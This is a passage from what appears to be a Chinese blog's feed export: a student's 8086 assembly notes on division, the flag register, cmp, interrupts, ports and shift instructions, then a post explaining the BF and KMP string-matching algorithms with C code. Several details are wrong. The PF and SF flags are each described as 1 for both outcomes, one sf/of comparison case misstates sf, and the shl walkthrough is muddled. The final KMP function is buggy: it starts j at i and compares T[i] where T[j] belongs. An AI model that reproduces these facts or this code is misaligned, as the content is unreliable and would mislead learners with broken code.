div</h3><p>这里的div指令可不是html里面的div，这里div是除法指令，使用的时候需要注意：</p><p>1、除数：有8位和16位两种，在一个reg或内存单元中。</p><p>2、被除数：默认放在AX或DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放；如果除数为16位，被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位。</p><p>3、结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数，如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数，</p><p>格式如下：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div reg(除数)</span><br><span class="line">div 内存单元(除数)</span><br></pre></td></tr></tbody></table></figure><h1 id="标志寄存器"><a class="markdownIt-Anchor" href="#标志寄存器"></a> 标志寄存器</h1><p>CPU内部的寄存器中，有一种有特殊的寄存器，称为<strong>标志寄存器</strong>，具有以下3中作用：</p><p>1、用来存储相关指令的某些执行结果</p><p>2、用来为CPU执行相关指令提供行为依据</p><p>3、用来控制CPU的相关工作方式</p><p>标志寄存器是按位起作用，每一位都有专门的含义。记录特定的信息。</p><p>8086CPU的标志寄存器结构如下：</p><table><thead><tr><th style="text-align:center"><strong>15</strong></th><th style="text-align:center"><strong>14</strong></th><th style="text-align:center"><strong>13</strong></th><th style="text-align:center"><strong>12</strong></th><th style="text-align:center"><strong>11</strong></th><th style="text-align:center"><strong>10</strong></th><th style="text-align:center"><strong>9</strong></th><th style="text-align:center"><strong>8</strong></th><th style="text-align:center"><strong>7</strong></th><th style="text-align:center"><strong>6</strong></th><th style="text-align:center"><strong>5</strong></th><th style="text-align:center"><strong>4</strong></th><th style="text-align:center"><strong>3</strong></th><th style="text-align:center"><strong>2</strong></th><th style="text-align:center"><strong>1</strong></th><th style="text-align:center"><strong>0</strong></th></tr></thead><tbody><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"><strong>OF</strong></td><td style="text-align:center"><strong>DF</strong></td><td style="text-align:center"><strong>IF</strong></td><td style="text-align:center"><strong>TF</strong></td><td style="text-align:center"><strong>SF</strong></td><td style="text-align:center"><strong>ZF</strong></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"><strong>PF</strong></td><td style="text-align:center"></td><td style="text-align:center"><strong>CF</strong></td></tr></tbody></table><h2 id="zf标志"><a class="markdownIt-Anchor" href="#zf标志"></a> ZF标志</h2><p>ZF为零标志位，它记录相关指令执行后，其结果是否为0。若结果为0，zf=1，结果不为0，zf=0。</p><p>例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1</span><br></pre></td></tr></tbody></table></figure><p>执行后结果为0，则zf=1</p><blockquote><p>在8086CPU的指令集中，有的指令的执行是影响标志寄存器的，比如：add、sub、div等；有的指令对标志寄存器没有影响，比如：mov、push、pop等。</p></blockquote><h2 id="pf标志"><a class="markdownIt-Anchor" href="#pf标志"></a> PF标志</h2><p>PF为奇偶标志位，它记录相关指令执行后，其结果的所有bit位中1的个数是否为偶数，若1的个数为偶数，pf=1，不为偶数，pf=1。</p><p>例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">add al,10</span><br></pre></td></tr></tbody></table></figure><p>执行后，(al)=00001011B，其中有3个1（奇数个），pf=0</p><h2 id="sf标志"><a class="markdownIt-Anchor" href="#sf标志"></a> SF标志</h2><p>SF为符号标志位，它记录相关指令执行后，其结果是否为负，若结果为负，sf=1，若不为负，sf=1</p><blockquote><p>在我们将数据当做有符号数来运算的时候，可以通过它来得知结果的正负，如果当做无符号来运算的时候，SF则无意义，虽然相关指令影响了它的值。</p></blockquote><h2 id="cf标志"><a class="markdownIt-Anchor" href="#cf标志"></a> CF标志</h2><p>CF为进位标志位，一般情况下进行<strong>无符号数</strong>运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。</p><blockquote><p>对于位数为N的无符号数来说，其对应的二进制信息的最高位，即N-1位，就是它的最高有效位，而假想存在的第N位，就是相对于最高有效位的更高位</p></blockquote><h2 id="of标志"><a class="markdownIt-Anchor" href="#of标志"></a> OF标志</h2><p>OF为溢出标志位，一般情况下，OF记录了<strong>有符号数</strong>运算的结果是否发生溢出，如果发生溢出，则OF=1，如果没有，OF=0</p><blockquote><p>需要注意的是，OF记录的是有符号数，CF记录的是无符号数</p></blockquote><h2 id="adc指令"><a class="markdownIt-Anchor" href="#adc指令"></a> adc指令</h2><p>adc是带进位加法指令，它利用了CF位上记录的进位值。</p><p>格式：adc 操作对象1，操作对象2</p><p>功能：操作对象1=操作对象1+操作对象2+CF</p><p>例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adc ax,bx</span><br></pre></td></tr></tbody></table></figure><p>实现的功能是：(ax)=(ax)+(bx)+CF</p><p>由此可见，adc指令比add指令多加了一个CF的值</p><h2 id="sbb指令"><a class="markdownIt-Anchor" href="#sbb指令"></a> sbb指令</h2><p>sbb是带借位减法指令，它利用了CF位上记录的借位值</p><p>格式：sbb 操作对象1，操作对象2</p><p>功能：操作对象1=操作对象1-操作对象2-CF</p><p>例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sbb ax,bx</span><br></pre></td></tr></tbody></table></figure><p>实现的功能是：(ax)=(ax)-(bx)-CF</p><h2 id="cmp指令"><a class="markdownIt-Anchor" href="#cmp指令"></a> cmp指令</h2><p>cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果，cmp指令执行后，将对标志寄存器产生影响。其他相关指令通过识别这些被影响的标志寄存器位来得知比较结果。</p><p>格式：cmp 操作对象1，操作对象2</p><p>功能：计算操作对象1-操作对象2，但不保存结果</p><p>例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp ax,ax</span><br></pre></td></tr></tbody></table></figure><p>这行指令执行后，结果为0，但是不在ax中保存，执行后，zf=1，pf=1，sf=0，cf=0，of=0</p><p>指令cmp ax,bx含义是比较ax和bx中的值，如果执行后：</p><p>zf=1，说明(ax)=(bx)</p><p>zf=0，说明(ax)≠(bx)</p><p>cf=1，说明(ax)&lt;(bx)</p><p>cf=0，说明(ax)≥(bx)</p><p>cf=0且zf=0，说明(ax)&gt;(bx)</p><p>cf=1或zf=1，说明(ax)≤(bx)</p><blockquote><p>有些时候，也可以用sf(得知实际结果的正负)的同时考察of(得知有没有溢出)，就可以得知逻辑上真正结果的正负，同时就可以知道比较的结果</p></blockquote><p>例如：cmp ah,bh：</p><p>1、如果sf=1，of=0</p><p>of=0，说明没有溢出，逻辑上结果的正负=实际结果的正负</p><p>因sf=1，实际结果为负，所以真正的结果也为负，(ah)&lt;(bh)</p><p>2、如果sf=1，of=1</p><p>of=1，说明有溢出，逻辑上结果的正负≠实际结果的正负</p><p>因sf=1，实际结果为负，所以真正的结果为正，(ah)&gt;(bh)</p><p>3、如果sf=0，of=1</p><p>of=1，说明有溢出，逻辑上结果的正负≠实际结果的正负</p><p>因sf=1，实际结果为非负，所以真正的结果为负，(ah)&lt;(bh)</p><p>4、如果sf=0，of=0</p><p>of=0，说明没有溢出，逻辑上结果的正负=实际结果的正负</p><p>因sf=0，实际结果为非负，所以真正的结果为非负，(ah)≥(bh)</p><h2 id="df-标志"><a class="markdownIt-Anchor" href="#df-标志"></a> DF 标志</h2><p>DF是方向标志位。在串处理指令中，控制每次操作后si、di的增减：</p><p>df=0 每次操作后si、di递增</p><p>df=1 每次操作后si、di递减</p><h2 id="pushf和popf"><a class="markdownIt-Anchor" href="#pushf和popf"></a> pushf和popf</h2><p>pushf的功能是将标志寄存器的值压栈，而popf是从栈中弹出数据，送入标志寄存器中。</p><h1 id="内中断"><a class="markdownIt-Anchor" href="#内中断"></a> 内中断</h1><p>任何一个通用的CPU，比如8086，都具备一种能力，可以在执行完当前正在执行的指令之后，检测到从CPU外部发送过来的或内部产生的一种特殊的信息，并且可以立即对所接收到的信息进行处理。这种特殊的信息，我们可以称其为：中断信息。中断的意思是指，CPU不再接着向下执行，而是转去处理这个特殊信息。</p><p>中断信息可以来自CPU内部和外部，这一张主要是内部的中断信息，也就是内中断。</p><h2 id="内中断的产生"><a class="markdownIt-Anchor" href="#内中断的产生"></a> 内中断的产生</h2><p><strong>当CPU内部有以下情况发生时，将产生相应的中断信息：</strong></p><p><strong>1、除法错误（比如执行div时，除法溢出）</strong></p><p><strong>2、单步执行</strong></p><p><strong>3、执行into指令</strong></p><p><strong>4、执行int指令</strong></p><blockquote><p>CPU首先要知道，所接收到的中断信息的来源，所以中断信息中必须包含识别来源的编码，8086CPU将这种编码称为中断类型码。</p></blockquote><p><strong>上述4种中断源在8086CPU中的中断码如下所示：</strong></p><p><strong>1、除法错误：0</strong></p><p><strong>2、单步执行：1</strong></p><p><strong>3、执行into指令：4</strong></p><p><strong>4、执行int指令，该指令格式为int n，n为字节型立即数，是提供给CPU的中断类型码。</strong></p><h2 id="中断向量表"><a class="markdownIt-Anchor" href="#中断向量表"></a> 中断向量表</h2><p>先来了解两个个概念：</p><p><strong>1、中断向量：中断处理程序的入口地址。</strong></p><p><strong>2、中断向量表：中断处理程序入口地址的列表。</strong></p><blockquote><p>中断向量表在内存中存放，对于8086PC机，中断向量表指定放在内存地址0处。从内存0000:0000到0000:03FF的1024个单元中存放着中断向量表，只要使用8086CPU，中断向量表就必须放在0000:0000~0000:03FF单元中，这是规定，因为8086CPU就从这个地方读取中断向量表。</p></blockquote><h2 id="中断过程"><a class="markdownIt-Anchor" href="#中断过程"></a> 中断过程</h2><p><strong>8086CPU在收到中断信息后，所引发的中断过程：</strong></p><p><strong>1、取得中断类型码</strong></p><p><strong>2、标志寄存器的值入栈</strong></p><p><strong>3、设置标志寄存器的第8位TF和第9位IF的值为0</strong></p><p><strong>4、CS的内容入栈</strong></p><p><strong>5、IP的内容入栈</strong></p><p><strong>6、从内存地址为中断类型码*4和中断类型码*4+2的两个字单元中读取中断处理程序的入口地址设置CS和IP</strong></p><p><strong>可以更简洁地描述中断过程：</strong></p><p><strong>1、取得中断类型码</strong></p><p><strong>2、pushf</strong></p><p><strong>3、TF=0，IF=0</strong></p><p><strong>4、push CS</strong></p><p><strong>5、push IP</strong></p><p><strong>6、(IP)=(N*4)，(CS)=(N*4+2)</strong></p><p><strong>最后一步完成后，CPU开始执行由程序员编写的中断处理程序。</strong></p><h2 id="中断处理程序和iret指令"><a class="markdownIt-Anchor" href="#中断处理程序和iret指令"></a> 中断处理程序和iret指令</h2><p><strong>中断处理程序的编写方法和子程序的比较相似，下面是常规步骤：</strong></p><p><strong>1、保存用到的寄存器</strong></p><p><strong>2、处理中断</strong></p><p><strong>3、恢复用到的寄存器</strong></p><p><strong>4、用iret指令返回</strong></p><p><strong>iret指令用汇编语法描述为：</strong></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop IP</span><br><span class="line">pop CS</span><br><span class="line">popf</span><br></pre></td></tr></tbody></table></figure><h1 id="int指令"><a class="markdownIt-Anchor" href="#int指令"></a> int指令</h1><p>中断信息可以来自内部和外部，上一章是内中断，这一章还是内中断，不过是另一种内中断。</p><h2 id="int指令-2"><a class="markdownIt-Anchor" href="#int指令-2"></a> int指令</h2><p>int指令的格式为int n；n是中断类型码，它的功能是引发中断过程。</p><p><strong>CPU执行int n指令，相当于引发一个n号中断的中断过程，执行过程如下：</strong></p><p><strong>1、取得中断类型码n</strong></p><p><strong>2、标志寄存器入栈，TF=0，IF=0</strong></p><p><strong>3、CS、IP入栈</strong></p><p><strong>4、(IP)=(n*4)，(CS)=(n*4+2)</strong></p><h2 id="bios-和dos所提供的中断历程"><a class="markdownIt-Anchor" href="#bios-和dos所提供的中断历程"></a> BIOS 和DOS所提供的中断历程</h2><p><strong>在系统板的ROM中存放着一套程序，称为BIOS(基本输入输出系统)，NIOS中主要包含以下几部分内容：</strong></p><p><strong>1、硬件系统的检测和初始化程序</strong></p><p><strong>2、外部中断和内部中断的中断例程</strong></p><p><strong>3、用于对硬件设备进行I/O操作的中断例程</strong></p><p><strong>4、其他和硬件系统相关的中断例程</strong></p><p>操作系统DOS也提供了中断例程，从操作系统的角度来看，DOS的中断例程就是操作系统向程序员提供的编程资源。</p><p>BIOS和DOS在所提供的中断例程中包含了许多子程序，这些子程序实现了程序员在编程的时候经常需要用到的功能。程序员在编程的时候，可以用int指令直接调用BIOS和DOS提供的中断例程，来完成某些工作。</p><p>和硬件设备相关的DOS中断例程中，一般都调用了BIOS的中断例程。</p><h1 id="端口"><a class="markdownIt-Anchor" href="#端口"></a> 端口</h1><p>前面说过，各种存储器都和CPU的地址线、数据线、控制线相连。CPU在操控它们的时候，把它们都当做内存来对待，把它们总体看做一个由若干个存储单元组成的逻辑存储器，这个逻辑器我们称为内存地址空间。</p><p>在PC机系统中，和CPU通过总线相连的芯片除各种存储器外，还有以下3种芯片：</p><p>1、各种接口卡上的接口芯片，它们控制接口卡进行工作</p><p>2、主板上的接口芯片，CPU通过它们对部分外设进行访问</p><p>3、其它芯片，用来存储相关的系统信息，或进行相关的输入输出处理</p><p>在这些芯片中，都有一组可以由CPU读写的寄存器，这些寄存器，它们在物理上可能处于不同的芯片中，但是它们在以下两点上相同：</p><p>1、都和CPU的总线相连，这种连接通过他们所在的芯片进行的</p><p>2、CPU对它们进行读或写的时候都通过控制线向它们所在的芯片发出端口读写命令</p><p>从CPU的角度，将这些寄存器当作端口，对它们进行统一编址，从而建立了一个统一的端口地址空间，每一个端口在地址空间中都有一个地址</p><p>CPU可以直接读写一以下3个地方的数据：</p><p>1、CPU内部的寄存器</p><p>2、内存单元</p><p>3、端口</p><p>这一章讨论端口的读写</p><h2 id="端口的读写"><a class="markdownIt-Anchor" href="#端口的读写"></a> 端口的读写</h2><p>在访问端口时，CPU通过端口地址来定位端口，因为端口所在的芯片和CPU通过总线相连，所以，端口地址和内存地址一样，通过总线来传送，在PC系统中，CPU最多可以定位64KB个不同的端口。端口地址范围为0~65535。</p><p>端口的读写指令只有两条：in和out，分别用于从端口读取数据和往端口写入数据。</p><p>CPU执行内存访问指令和端口访问指令时候，总线上的信息：</p><p>1、访问内存</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,ds:[8]  ;假设执行前(ds)=0</span><br></pre></td></tr></tbody></table></figure><p>执行时与总线相关操作如下所示：</p><p>● CPU通过地址线将地址信息8发出</p><p>● CPU通过控制线发出内存命令读命令，选中存储器芯片，并通知它，将要从中读取数据</p><p>● 存储器将8号单元中的数据通过数据线送入CPU</p><p>2、访问端口</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in al,60h</span><br></pre></td></tr></tbody></table></figure><p>执行时与总线相关操作如下所示：</p><p>● CPU通过地址线将地址信息60h发出</p><p>● CPU通过控制线发出端口读命令，选中端口所在的芯片，并通知它，将要从中读取数据</p><p>● 端口所在的芯片将60h端口中的数据通过数据线送入CPU</p><blockquote><p>注意：在in和out指令中，只能使用ax或al来存放从端口中读入的数据或要发送到端口中的数据。访问8位端口时用al，访问16位端口时用ax</p></blockquote><p>对0~255以内的端口进行读写时：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">in al,20h   ;从20h端口读入一个字节</span><br><span class="line">out 20h,al  ;往20h端口写入一个字节</span><br></pre></td></tr></tbody></table></figure><p>对256~65535的端口进行读写时，端口号放在dx中：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov dx,3f8h  ;将端口号3f8h送入dx</span><br><span class="line">in al,dx     ;从3f8h端口读入一个字节</span><br><span class="line">out dx,al    ;向3f8h端口写入一个字节</span><br></pre></td></tr></tbody></table></figure><h2 id="shl和shr指令"><a class="markdownIt-Anchor" href="#shl和shr指令"></a> shl和shr指令</h2><p>shl和shr是逻辑移位指令。</p><h3 id="shl"><a class="markdownIt-Anchor" href="#shl"></a> shl</h3><p>shl是逻辑左移指令，它的功能为：</p><p>1、将一个寄存器或内存单元中的数据向左移位</p><p>2、将最后移出的一位写入CF中</p><p>3、最低位用0补充</p><p>例如：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,01001000b</span><br><span class="line">shl al,1   ;将al中的数据左移一位</span><br></pre></td></tr></tbody></table></figure><p>过程如下：</p><p>1、左移</p><p>​      原数据：   01001000</p><p>​      左移后： 01001000</p><p>2、最后移出的一位写入CF=0</p><p>​      原数据：   01001000</p><p>​      左移后：   1001000</p><p>3、最低位用0补充</p><p>​      原数据：   01001000</p><p>​      左移后：   10010000</p><blockquote><p>如果移动位数大于1，必须将移动位数放在cl中</p><p>比如：</p><p>mov al ,01001000b</p><p>mov cl,3</p><p>shl al,cl</p><p>这样实现了左移3位</p></blockquote><h3 id="shr"><a class="markdownIt-Anchor" href="#shr"></a> shr</h3><p>shr是逻辑右移指令，它的功能为：</p><p>1、将一个寄存器或内存单元中的数据向右移位</p><p>2、将最后移出的一位写入CF中</p><p>3、最高位用0补充</p><blockquote><p>同理，如果移动位数大于1，必须将移动位数放在cl中</p></blockquote><blockquote><p>后面的外中断等内容就先不整理了，有时间再写一写</p></blockquote><p><b><big></big></b></p><center><b><big>10天整理完了！Nice!!!</big></b></center><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模式匹配算法——KMP的从理解到不懂到再会的历程</title>
      <link href="/posts/bf-kmp/"/>
      <url>/posts/bf-kmp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>这篇博文基于我之前的数据结构那篇文章，里面的"串"那一章最后剩下的KMP算法没有讲；</p><p>今天上课，老师成功地把我会的KMP讲成不会的啦（没说讲的不好）🙃</p><h1 id="bf算法"><a class="markdownIt-Anchor" href="#bf算法"></a> BF算法</h1><p>先讲讲BF算法：</p><p><strong>暴风(Brute Force)算法是普通的模式匹配算法，BF算法的思想就是将目标串S的第一个字符与模式串T的第一个字</strong></p><p><strong>符进行匹配，若相等，则继续比较S的第二个字符和 T的第二个字符；若不相等，则比较S的第二个字符和T的第一</strong></p><p><strong>个字符，依次比较下去，直到得出最后的匹配结果。BF算法是一种暴力算法。</strong></p><p>看下它的代码实现：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BF</span><span class="params">(<span class="keyword">char</span> *S, <span class="keyword">char</span> *T)</span></span></span><br><span class="line"><span class="function"></span>{   <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k; </span><br><span class="line"><span class="keyword">while</span> (i &lt; <span class="built_in">strlen</span>(S) &amp;&amp; j &lt; <span class="built_in">strlen</span>(T)) </span><br><span class="line">{ </span><br><span class="line"><span class="keyword">if</span> (S[i] == T[j]) </span><br><span class="line">{ </span><br><span class="line">i++; </span><br><span class="line">j++; </span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">{ </span><br><span class="line">i = i - j + <span class="number">1</span>; j = <span class="number">0</span>; </span><br><span class="line">}</span><br><span class="line">} </span><br><span class="line"><span class="keyword">if</span> (j &gt;= <span class="built_in">strlen</span>(T)) </span><br><span class="line">{ </span><br><span class="line">k = i - <span class="built_in">strlen</span>(T) + <span class="number">1</span>; </span><br><span class="line">} </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">k = <span class="number">0</span>; </span><br><span class="line">} </span><br><span class="line"><span class="keyword">return</span> k; </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> pos;</span><br><span class="line">    <span class="keyword">char</span> S[<span class="number">100</span>],T[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s %s"</span>,S,T);</span><br><span class="line">pos = BF(S,T);</span><br><span class="line"><span class="keyword">if</span>(pos) </span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"S存在与T相同的子串，位置为第%d个\n"</span>,pos);</span><br><span class="line">    }</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"S不存在与T相同的子串\n"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这种算法也是可以找到匹配的位置，但是效率不高，<strong>时间复杂度为O(M*N);</strong></p><h1 id="kmp算法"><a class="markdownIt-Anchor" href="#kmp算法"></a> KMP算法</h1><p>既然BF算法效率不高，那就寻找一种简便的方法来实现相同的功能——KMP；</p><p><strong>KMP算法：D.E.Knuth、J.H.Morris、V.R.Pratt发表的一个模式匹配算法，可以大大避免重复遍历（减少回</strong></p><p><strong>溯）的情况，称之为克努特—莫里斯—普拉特算法，简称为KMP算法；</strong></p><p>直接上代码，这里没法解释</p><h3 id="获取next数组"><a class="markdownIt-Anchor" href="#获取next数组"></a> 获取next数组：</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Get_Next</span><span class="params">(<span class="keyword">char</span> *T,<span class="keyword">int</span> *next)</span></span></span><br><span class="line"><span class="function"></span>{   </span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line">next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="built_in">strlen</span>(T))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">0</span>||T[i]==T[j])</span><br><span class="line">{</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">next[i] = j;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">j = next[j];</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>注意！！！！</strong></p><p><strong>这里数组下标是从1开始的，但是数组默认从0开始，所以在调用这个函数的时候，不能直接：</strong></p><p><strong>// scanf("%s",S); Get_Next(S,next);</strong></p><p>***如果这样写，100%错的（自闭一晚上才看出来，可见博主是多么菜）***😭😭</p><p><em><strong>然后，就…没有然后了，555555</strong></em></p><p><strong>算了，还是改进一下吧，把数组从0开始赋值：</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Get_Next</span><span class="params">(<span class="keyword">char</span> *T,<span class="keyword">int</span> *next)</span></span></span><br><span class="line"><span class="function"></span>{   </span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line">next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">j = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="built_in">strlen</span>(T)<span class="number">-1</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">-1</span>||T[i]==T[j])</span><br><span class="line">{</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">next[i] = j;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">j = next[j];</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这样写就可以直接输入串了，不用考虑下标问题了…</p><h3 id="kmp"><a class="markdownIt-Anchor" href="#kmp"></a> KMP</h3><p>无话可说，代码很好懂😀</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">KMP</span><span class="params">(<span class="keyword">char</span> *S,<span class="keyword">char</span> *T,<span class="keyword">int</span> pos)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i = pos;</span><br><span class="line"><span class="keyword">int</span> j = i;</span><br><span class="line"><span class="keyword">int</span> next[<span class="number">100</span>];</span><br><span class="line">Get_Next(T,next);</span><br><span class="line"><span class="keyword">while</span>(i&lt;=<span class="built_in">strlen</span>(S)&amp;&amp;j&lt;=<span class="built_in">strlen</span>(T))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">0</span>||S[i]==T[i])</span><br><span class="line">{</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">j = next[j];</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(j&gt;<span class="built_in">strlen</span>(T))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> i-<span class="built_in">strlen</span>(T);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>KMP算法的时间复杂度为O(M+N);</strong></p><p>对比BF算法的时间复杂度，显然，KMP好一些；</p><p>.</p><p>.</p><p>无</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = 